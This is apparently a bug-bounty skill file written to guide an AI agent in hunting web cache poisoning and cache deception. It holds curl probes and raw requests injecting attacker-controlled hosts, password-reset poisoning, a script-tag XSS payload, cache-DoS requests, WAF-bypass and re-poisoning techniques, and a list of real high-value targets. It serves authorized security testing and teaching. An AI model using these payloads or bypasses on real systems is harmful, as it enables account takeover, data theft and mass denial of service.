---
name: hunt-cache-poison
description: Hunting skill for cache poison vulnerabilities.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: github, hackerone_public, portswigger_research, omergil_research, youstin_research
report_count: 8
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Crown Jewel Targets

Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously — one request, mass exploitation. Payout scales with blast radius.

**Highest-value targets:**
- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges) — poisoning these affects every visitor globally
- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts) — session hijack or affiliate fraud potential
- **Gaming platforms with update servers** (rockstargames updates.* domains) — DoS on update delivery = widespread client breakage
- **Authentication endpoints** served through caches — leads to account takeover (the highest severity variant)
- **Asset CDNs** (JS/CSS delivery) — XSS payload delivery at scale
- **SaaS multi-tenant platforms** — one poisoned response bleeds into all tenants sharing a cache key

**Asset types that pay most:** CDN hostnames, subdomain-per-tenant patterns, update/download servers, login/account pages cached incorrectly, affiliate link shorteners.

---

## Autonomous Testing Priority

**Two distinct attacks live under this skill — target the simpler one first.**

**Attack 1 — Password Reset Poisoning (Host header injection):**

The app uses the `Host` header to construct the password reset link in the email. Inject an attacker-controlled hostname; the victim's reset email contains a link to your server.

```
POST /forgot-password
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com

email=victim@target.com
Content-Type: application/x-www-form-urlencoded
```

Use a distinctive hostname you control or can identify in the response. **Proof:** the injected hostname appears in the response body (some apps reflect the generated reset link), or the action succeeds (2xx with a "reset email sent" message) after injection — confirming the poisoned link would be sent to the victim.

Try multiple host headers — apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).

**Attack 2 — Web Cache Poisoning:**

Inject the attacker-controlled hostname into `X-Forwarded-Host` on a GET request for a cacheable page. If the hostname is reflected in the response body AND the response gets cached, subsequent visitors receive the poisoned response.

Check for cache signals in the response: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: <nonzero>`, or `Via: cloudfront/varnish/fastly`.

**Proof for both:** injected value reflected in response body, or action completed successfully despite the manipulated header.

---

## Attack Surface Signals

**URL patterns to look for:**
- `cdn.`, `assets.`, `static.`, `updates.`, `downloads.` subdomains
- URL path structures with extensions that look static: `/path/to/page.css`, `/account.php/nonexistent.jpg`
- Affiliate/link shortener endpoints: `/link/`, `/go/`, `/ref/`, `/out/`
- Paths that mix dynamic content with cacheable-looking URLs

**Response headers that signal a cache:**
```
X-Cache: HIT / MISS
X-Cache-Status: HIT
CF-Cache-Status: HIT / MISS (Cloudflare)
Age: <nonzero>
Via: 1.1 varnish / cloudfront / fastly
Cache-Control: public, max-age=...
Surrogate-Control: max-age=...
X-Served-By: cache-...
```

**JS/tech stack signals:**
- Fastly, Varnish, Cloudfront, Akamai, Nginx proxy_cache in response headers
- Shopify/Linkpop stacks with third-party integrations
- Platforms using path-based routing without normalizing trailing segments
- Servers that reflect unvalidated headers into responses (Host, X-Forwarded-Host, X-Original-URL)

**Dangerous header candidates (unkeyed inputs):**
```
X-Forwarded-Host
X-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Forwarded
X-HTTP-Method-Override
```

---

## Step-by-Step Hunting Methodology

1. **Map cache infrastructure.** Send a GET to the target and inspect response headers. Identify the caching layer (Cloudflare, Fastly, Varnish, Nginx). Note `Age`, `X-Cache`, `CF-Cache-Status` headers.

2. **Identify cache key components.** Send two identical requests — if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).

3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.com` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=<random>`) so the probe lands on a cache MISS under a throwaway key — this verifies reflection without prematurely storing a live poison entry under the real, victim-shared cache key. (Param Miner's "Guess headers" mode is the canonical Burp tool for discovering these unkeyed headers/parameters automatically.)

4. **Test URL path manipulation (Web Cache Deception).** Append fake static extensions to dynamic endpoints:
   - `GET /account/profile.css`
   - `GET /dashboard/settings.jpg`
   - `GET /affiliate-link/target.js`
   Check if the server returns dynamic content AND the cache stores it.

5. **Test for DoS via cache poisoning.** Send a request with a header that causes a 4xx/5xx error and check if that error response gets cached:
   - Malformed `Host` header
   - `X-Forwarded-Host` pointing to an invalid host
   - Oversized headers that trigger backend errors

6. **Confirm unkeyed parameter poisoning.** Try query parameter fatigue or HTTP parameter pollution:
   - `GET /page?utm_source="><script>alert(1)</script>`
   Check if the param is reflected and cached for clean requests to `/page`.

7. **Validate cache storage.** After sending a potentially poisoned request, immediately request the same URL WITHOUT the malicious header from a different IP or incognito session. If you receive the poisoned response — it's confirmed.

8. **Measure cache TTL.** Check `Cache-Control: max-age` and `Age` to understand how long the poison persists and whether it's exploitable before expiry.

9. **Check affiliate/link flows specifically.** For platforms like Linkpop, test whether the referrer/product URL is embedded in a cacheable response that another user will receive.

10. **Document blast radius.** Determine: global CDN edge (worldwide), regional cache, or single-server cache. This directly affects severity rating.

---

## Payload & Detection Patterns

**Confirm caching behavior:**
```bash
# Send twice, compare Age header
curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
```

**Test unkeyed X-Forwarded-Host:**
```bash
curl -s -H "X-Forwarded-Host: evil.attacker.com" \
  "https://target.com/page" | grep -i "evil.attacker.com"
```

**Test Web Cache Deception (path appending):**
```bash
# Authenticated session cookie required
curl -s -b "session=YOUR_SESSION" \
  "https://target.com/account/profile.css"

# Then fetch without auth from another client
curl -s "https://target.com/account/profile.css"
```

**Force cache miss to test poison without hitting cached version:**
```bash
# Use a unique cache-busting query param to land on a fresh key — do NOT rely on
# client-sent "Cache-Control: no-cache" (per RFC 7234 it requests revalidation, not
# skip-storage, and Cloudflare/Fastly/Akamai generally ignore it on cacheable assets).
curl -s -H "X-Forwarded-Host: canary.attacker.com" \
     "https://target.com/page?cb=$RANDOM"
```

**DoS via poisoned error response:**
```bash
curl -s -H "X-Forwarded-Host: aaaaaaaaaaa.invalid" \
  "https://target.com/js/app.js" -I
# Check if next clean request returns error
curl -s -I "https://target.com/js/app.js" | grep "HTTP/"
```

**Grep patterns in Burp/ZAP response history:**
```
# Headers indicating cache hit
X-Cache: HIT
CF-Cache-Status: HIT
Age: [1-9]

# Reflected unkeyed input in body
evil\.attacker\.com
canary\d+\.

# Web cache deception indicators
Content-Type: text/css  (but response is HTML/JSON)
Cache-Control: public.*max-age  (on authenticated endpoint)
```

**Parameter pollution test:**
```bash
curl -s "https://target.com/page?cb=1&param=CANARY_VALUE" | grep CANARY_VALUE
# Then check if clean request returns poisoned version
curl -s "https://target.com/page?cb=1"
```

**Burp Suite Intruder wordlist for unkeyed headers:**
```
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
X-Original-URL
X-Rewrite-URL
X-Forwarded-Scheme
X-Forwarded-Proto
True-Client-IP
```

---

### Origin header → ACAO cache poisoning
Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Access-Control-Allow-Origin` and then cached: `curl -H "Origin: evil.example" URL -I` on two consecutive hits. A cached attacker/`*` ACAO breaks CORS for legit users (cache-DoS); a cached permissive ACAO enables cross-user data reads. Disclosed: reports/591302.

## Common Root Causes

1. **CDN misconfiguration — caching based on URL path only.** Engineers configure cache rules like "cache everything matching `*.js`" without realizing the path can be appended to dynamic routes. The origin server ignores the extra path segments, but the CDN uses them as cache keys.

2. **Unkeyed header forwarding.** Developers configure reverse proxies to forward `X-Forwarded-Host` to backends for URL generation (canonical links, redirects, password reset emails) without including it in the cache key. The CDN caches the poisoned response.

3. **Web Cache Deception via permissive routing.** Frameworks that normalize URLs (e.g., Rails, Express) accept `/account/settings.css` and serve the same response as `/account/settings`. The CDN sees a `.css` extension and applies aggressive caching rules.

4. **Shared caching of multi-tenant responses.** SaaS platforms that use a single CDN without tenant isolation in the cache key allow cross-tenant cache poisoning.

5. **Error responses cached without thought.** Backend errors (404, 500) triggered by attacker-controlled input get cached, causing DoS for legitimate users. Developers implement caching without excluding error status codes.

6. **Lazy `Vary` header implementation.** Developers know they should add `Vary: X-Forwarded-Host` but forget, or CDNs strip/ignore `Vary` headers entirely (Cloudflare historically strips Vary on some asset types).

7. **Third-party integrations with URL reflection.** Affiliate/link tracking systems (like Shopify Linkpop) reflect the destination URL in metadata, canonical tags, or redirects — and these get cached globally.

---

## Bypass Techniques

**Defense: WAF blocking known poison headers**
- Bypass: Use less-common header variants: `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=evil.com`, `X-Original-URL`
- Bypass: Header value encoding: `X-Forwarded-Host: evil%2ecom`
- Bypass: Case variation: `x-forwarded-host`, `X-FORWARDED-HOST`

**Defense: Stripping attacker-supplied headers at edge**
- Bypass: Use HTTP/2 pseudo-header manipulation if the proxy downgrades to HTTP/1.1
- Bypass: Inject via HTTP Request Smuggling — smuggle a request with poison headers past the WAF to hit the cache server directly

**Defense: Require authentication before caching**
- Bypass: Web Cache Deception — trick the cache into storing authenticated content by appending `.css`/`.js` to the URL, which matches a cache rule that ignores auth

**Defense: Cache key includes full URL with query string**
- Bypass: HTTP Parameter Pollution — some parsers take the first occurrence, caches key on full string; inject `?legit=1&param=evil` and cache stores it under `?legit=1&param=evil` but victim visits `?legit=1`
- Bypass: Fat GET request — send body parameters that the backend processes but the cache ignores

**Defense: Short TTL / rapid cache purging**
- Bypass: Automate re-poisoning; send the poison request in a loop just ahead of TTL expiry
- Bypass: Target CDN nodes with longer default TTLs by routing requests through specific PoPs

**Defense: `Cache-Control: private` on sensitive endpoints**
- Bypass: Check if CDN respects this header (some CDNs ignore it if an admin has overridden cache rules globally)
- Bypass: Find adjacent cacheable endpoints that reflect the same sensitive data

---

## Gate 0 Validation

1. **What can the attacker DO right now?**
   The attacker must be able to poison a cache entry and then demonstrate that a *separate, unauthenticated request* from a different client/IP receives the poisoned response — not just their own browser. If only the attacker sees the effect, it's not cache poisoning.

2. **What does the victim LOSE?**
   Must be one of: (a) session/account compromise via reflected credentials in poisoned response, (b) execution of attacker-controlled JS via poisoned asset, (c) service denial where legitimate requests return error responses, or (d) sensitive data disclosure (account details cached and served to other users). "Weird response headers" alone is not impact.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: send the poisoning request → wait for cache store → fetch the URL from incognito/different IP → observe poisoned response. If you can't demonstrate this clean reproduction with a second client, the cache may not actually be storing the poison and the report isn't ready.

---

## Real Impact Examples

**Scenario 1 — Mass DoS on CDN Asset Delivery (Shopify CDN)**
An attacker identified that CDN-served JavaScript assets on `cdn.shopify.com` could be poisoned by sending a request with a crafted header that caused the origin to return a 4xx error. The CDN cached this error response. Any merchant storefront loading that asset then received the cached error instead of the valid JS file — breaking checkout flows and storefront functionality across all stores sharing that CDN path. One HTTP request, global merchant impact, persisting until cache TTL expired.

**Scenario 2 — Account Takeover via Web Cache Deception**
On a platform serving authenticated account pages, an attacker crafted a URL like `/account/profile/photo.jpg` and sent it to a victim (via phishing link). When the victim (authenticated) visited the URL, the server responded with their full account profile page (name, email, session tokens). Because the URL ended in `.jpg`, the CDN cached the authenticated response publicly. The attacker then fetched `/account/profile/photo.jpg` without authentication and received the victim's account data — enabling full account takeover. Impact was amplified because the cache served the same response to any subsequent requester.

**Scenario 3 — Affiliate Link Hijacking via URL Path Manipulation (Shopify Linkpop)**
An attacker discovered that the Linkpop affiliate link service would cache responses based on URL path but reflected a manipulated product destination URL in the cached HTML. By visiting a specially crafted path before legitimate users, the attacker poisoned the cache to redirect affiliate clicks to an attacker-controlled domain instead of the legitimate Amazon product. Victims clicking what appeared to be valid merchant links were sent to attacker infrastructure, enabling credential phishing and loss of affiliate commission revenue for the legitimate merchant.

---

## Disclosed Report Citations (2017-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans the two major families: cache **poisoning** (attacker influences a cached response served to victims) and cache **deception** (attacker tricks the cache into storing a victim's private response).

1. **Shopify — Cache poisoning via X-Forwarded-Host** ([H1 #977851](https://hackerone.com/reports/977851))
    - Subclass: X-Forwarded-Host header poisoning (unkeyed input → redirect/script-src corruption)
    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.com` — single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
    - Root cause: X-Forwarded-Host influenced asset/redirect URL generation but was NOT part of the cache key
    - Year: 2020 — **$1,300 → escalated to $6,300** (one-shot poison, multi-host blast radius)

2. **HackerOne — Cache poisoning DoS via X-Forwarded-Port** ([H1 #409370](https://hackerone.com/reports/409370))
    - Subclass: X-Forwarded-Host / X-Forwarded-Port DoS (poisoned redirect to invalid port)
    - Payload: `GET /<redirect-path>` with `X-Forwarded-Port: 1` — cached 301 redirect pointed legitimate users at port 1, breaking access
    - Root cause: trusted X-Forwarded-* headers in 301 redirect generation; cache stored the bad Location
    - Year: 2018 — **$2,500** (foundational H1-on-H1 case)

3. **GitLab — Cache poisoning DoS via X-HTTP-Method-Override** ([H1 #1160407](https://hackerone.com/reports/1160407))
    - Subclass: method-cloaking / GCS cache-key bleed (HEAD response stored under GET key)
    - Payload: `GET /assets/webpack/*.js` with `X-HTTP-Method-Override: HEAD` — GCS backend honored the override and returned an empty body; CDN cached it as the canonical GET response
    - Root cause: CDN cache not method-aware; HEAD body (empty) overwrote GET entry for cached static assets
    - Year: 2021 — **$2,500** (DoS normally OOS, paid for novelty)

4. **PayPal — Web Cache Deception (Omer Gil original)** ([Blog](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html))
    - Subclass: classic WCD via `.css`/`.jpg`/etc. path appending on authenticated routes
    - Payload: `GET https://www.paypal.com/myaccount/home/foo.css` — origin served full authenticated account page; CDN cached it as "static .css" for ~5 hours
    - Root cause: origin routed unknown path suffixes to the parent dynamic handler; CDN cached based purely on the static-looking file extension
    - Year: 2017 — **$3,000** (PortSwigger Top-10 Web Hacking Technique of 2017, #2)

5. **Cloudflare PBB — Cache Deception Armor bypass via `.avif`** ([H1 #1391635](https://hackerone.com/reports/1391635))
    - Subclass: CDN-specific allowlist bypass (Cloudflare's WCD protection feature) using an obscure image extension
    - Payload: `GET https://<protected-origin>/account/me.avif` — Cloudflare's Cache Deception Armor extension list omitted `.avif`, so the authenticated HTML response was cached
    - Root cause: Cache Deception Armor used a static, incomplete extension allowlist that did not cover modern image MIME types
    - Year: 2022 — Cloudflare PBB bounty (amount undisclosed)

6. **Akamai (PayPal/Airbnb/Goldman Sachs) — Hop-by-hop header smuggling → server-side edge poisoning** ([Tediosi & Mariani writeup](https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b))
    - Subclass: CDN-specific request-smuggling that lands attacker responses in Akamai's edge cache for nearby IPs
    - Payload: `Connection: Content-Length` + crafted request — Akamai's first proxy stripped Content-Length as hop-by-hop, second proxy treated body as a second request whose response was cached at the edge
    - Root cause: inconsistent handling of hop-by-hop headers across Akamai proxy tiers caused desync; smuggled responses were server-side cached globally
    - Year: 2022 — **>$50K total** across affected programs (PayPal $25,200 + Airbnb $14,875 + Goldman Sachs $100), PortSwigger Top-10 Web Hacking Techniques 2022 nominee

7. **James Kettle (PortSwigger) — "Gotta cache 'em all": path-normalization & WCD against Cloudflare/Fastly/GCP** ([PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all))
    - Subclass: cache-key path normalization discrepancies and Web Cache Deception across major CDNs (Cloudflare, Fastly, GCP/Google Cloud) — the 2024 research named in this skill's description
    - Payload: origin-vs-cache delimiter/normalization disagreements (e.g. encoded path segments and static-suffix tricks) that cause the cache to store a dynamic/authenticated response under a static-looking key
    - Root cause: cache and origin disagree on how to normalize/parse the URL path, so the cache key does not match the resource the origin actually served
    - Year: 2024 — coordinated CDN-vendor disclosure; methodology research (no single bounty), PortSwigger Top-10 Web Hacking Techniques 2024 entry

---

## Related Skills & Chains

- **`hunt-xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
- **`hunt-http-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
- **`hunt-auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
- **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
